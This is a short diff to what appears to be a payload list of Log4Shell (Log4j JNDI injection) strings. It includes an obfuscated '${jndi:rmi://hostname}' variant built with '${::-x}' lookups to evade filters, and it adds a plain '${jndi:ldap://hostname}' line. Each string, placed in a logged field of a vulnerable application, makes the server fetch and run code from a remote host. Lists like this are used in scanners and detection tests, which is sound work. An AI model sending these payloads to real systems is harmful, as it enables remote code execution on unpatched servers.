@@ -1,2 +1,4 @@
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://hostname}
+
 ${${::-j}ndi:rmi://hostname}
+${jndi:ldap://hostname}
